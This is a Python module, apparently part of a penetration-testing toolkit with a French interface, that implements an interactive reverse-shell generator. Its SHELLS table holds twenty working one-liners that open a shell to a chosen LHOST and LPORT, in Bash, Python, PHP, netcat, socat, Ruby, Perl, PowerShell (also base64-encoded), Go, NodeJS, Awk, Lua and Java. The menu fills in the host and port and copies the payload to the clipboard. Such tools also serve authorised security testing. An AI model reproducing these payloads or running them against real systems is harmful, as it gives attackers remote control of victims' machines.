"""Reverse Shell Generator — generates one-liners for multiple languages/OS."""
import base64
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.syntax import Syntax
from rich import box
from core.variables import VariableStore
from core.theme import help_footer, status_bar

console = Console()

SHELLS: list[tuple[str, str, str, str]] = [
    ("1",  "Bash TCP",       "bash -i",         "bash -i >& /dev/tcp/{H}/{P} 0>&1"),
    ("2",  "Bash UDP",       "bash UDP",         "bash -i >& /dev/udp/{H}/{P} 0>&1"),
    ("3",  "Python3",        "subprocess",       "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{H}\",{P}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"),
    ("4",  "Python3 PTY",    "pty shell",        "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{H}\",{P}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"),
    ("5",  "PHP exec",       "php exec",         "php -r '$sock=fsockopen(\"{H}\",{P});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
    ("6",  "PHP popen",      "php popen",        "php -r '$s=fsockopen(\"{H}\",{P});popen(\"/bin/sh -i <&3 >&3 2>&3\",\"r\");'"),
    ("7",  "Netcat -e",      "nc classique",     "nc {H} {P} -e /bin/bash"),
    ("8",  "Netcat mkfifo",  "nc sans -e",       "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {H} {P} >/tmp/f"),
    ("9",  "Netcat BSD",     "busybox nc",       "busybox nc {H} {P} -e /bin/sh"),
    ("10", "Socat PTY",      "socat pty",        "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{H}:{P}"),
    ("11", "Socat listen",   "côté attaquant",   "socat file:`tty`,raw,echo=0 tcp-listen:{P}"),
    ("12", "Ruby",           "ruby socket",      "ruby -rsocket -e 'f=TCPSocket.open(\"{H}\",{P}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"),
    ("13", "Perl",           "perl socket",      "perl -e 'use Socket;$i=\"{H}\";$p={P};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"),
    ("14", "PowerShell",     "windows PS",       "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{H}',{P});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$by=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($by,0,$by.Length);$s.Flush()};$c.Close()\""),
    ("15", "PowerShell B64", "PS encodé b64",    "__PS_B64__"),
    ("16", "Golang",         "go socket",        "echo 'package main;import(\"net\";\"os/exec\");func main(){c,_:=net.Dial(\"tcp\",\"{H}:{P}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/r.go && go run /tmp/r.go"),
    ("17", "NodeJS",         "node tcp",         "var n=require('net'),s=new n.Socket(),cp=require('child_process');s.connect({P},'{H}',function(){var sh=cp.spawn('/bin/sh',[]);sh.stdin=s;sh.stdout=s;sh.stderr=s});"),
    ("18", "Awk",            "awk inet",         "awk 'BEGIN{s=\"/inet/tcp/0/{H}/{P}\";while(42){do{printf \"$ \"|&s;s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!=\"exit\")}}' /dev/null"),
    ("19", "Lua",            "lua socket",       "lua -e \"require('socket');t=require('socket').tcp();t:connect('{H}','{P}');io.input(t);io.output(t);require('os').execute('/bin/sh')\""),
    ("20", "Java",           "java runtime",     "Runtime r=Runtime.getRuntime();Process p=r.exec(new String[]{\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{H}/{P};cat <&5|while read l;do $l 2>&5>&5;done\"});p.waitFor();"),
]


def _ps_b64(lhost: str, lport: str) -> str:
    cmd = (
        f"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
        "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
        "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
        "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
        "$sb=(iex $d 2>&1|Out-String);"
        "$sb2=$sb+'PS '+(pwd).Path+'> ';"
        "$by=([text.encoding]::ASCII).GetBytes($sb2);"
        "$s.Write($by,0,$by.Length);$s.Flush()};$c.Close()"
    )
    b64 = base64.b64encode(cmd.encode("utf-16-le")).decode()
    return f"powershell -enc {b64}"


class RevShellMenu:
    def __init__(self, store: VariableStore) -> None:
        self._store = store

    def show(self) -> None:
        lhost = self._store.get("LHOST") or ""
        lport = self._store.get("LPORT") or "4444"

        while True:
            console.clear()
            console.print(Panel(
                "[bold red]Reverse Shell Generator[/bold red]  [dim]— one-liners prêts à l'emploi[/dim]",
                border_style="red", padding=(0, 1),
            ))
            console.print()
            status_bar([
                ("LHOST", lhost or "[dim]non défini[/dim]", "bold bright_cyan"),
                ("LPORT", lport, "bold bright_yellow"),
                ("Shells", str(len(SHELLS)), "grey70"),
            ])
            console.print()

            if not lhost:
                console.print("  [yellow]⚠[/yellow]  LHOST non défini — [bold]lh <ip>[/bold] pour le définir.\n")

            t = Table(show_header=True, header_style="bold cyan",
                      box=box.SIMPLE_HEAVY, expand=True)
            t.add_column("#",    width=4,  style="bold yellow", justify="right")
            t.add_column("Type", width=18, style="bold white")
            t.add_column("Description", style="grey70")
            for key, label, desc, _ in SHELLS:
                t.add_row(key, label, desc)

            console.print(Panel(t, title=" Shells disponibles ", title_align="left",
                                border_style="dim red", padding=(0, 1)))
            console.print()
            help_footer([
                ("<n>",       "afficher le shell #n"),
                ("lh <ip>",   "définir LHOST"),
                ("lp <port>", "définir LPORT"),
                ("b / q",     "retour"),
            ], title="Reverse Shell Generator")

            try:
                raw = console.input("\n  [bold red]>[/bold red] ").strip()
            except (KeyboardInterrupt, EOFError):
                break
            if not raw or raw in {"b", "q"}:
                break

            parts = raw.split()
            cmd = parts[0].lower()

            if cmd == "lh" and len(parts) >= 2:
                lhost = parts[1]
                self._store.set("LHOST", lhost)
                console.print(f"  [green]✓[/green] LHOST = {lhost}")
                console.input("[dim]  Entrée…[/dim]")
            elif cmd == "lp" and len(parts) >= 2:
                lport = parts[1]
                self._store.set("LPORT", lport)
                console.print(f"  [green]✓[/green] LPORT = {lport}")
                console.input("[dim]  Entrée…[/dim]")
            elif parts[0].isdigit():
                if not lhost:
                    console.print("  [red]LHOST non défini.[/red]")
                    console.input("[dim]  Entrée…[/dim]")
                    continue
                payload = None
                for k, label, _, tpl in SHELLS:
                    if k == parts[0]:
                        if tpl == "__PS_B64__":
                            payload = _ps_b64(lhost, lport)
                        else:
                            payload = tpl.replace("{H}", lhost).replace("{P}", lport)
                        console.print()
                        console.print(f"  [bold white]{label}[/bold white]  [dim](LHOST={lhost} LPORT={lport})[/dim]")
                        break
                if payload:
                    console.print()
                    console.print(Panel(
                        Syntax(payload, "bash", theme="monokai", word_wrap=True),
                        border_style="red", padding=(0, 1),
                    ))
                    console.print()
                    action = console.input("  [dim]Entrée=copier  b=retour >[/dim] ").strip().lower()
                    if action != "b":
                        try:
                            import pyperclip

                            pyperclip.copy(payload)
                            console.print("  [green]✓[/green] Copié.")
                        except Exception:
                            console.print("  [dim]pyperclip non disponible.[/dim]")
                    console.input("[dim]  Entrée…[/dim]")
            else:
                console.print("  [dim]Commande inconnue. n=shell lh=LHOST lp=LPORT b=retour[/dim]")
                console.input("[dim]  Entrée…[/dim]")
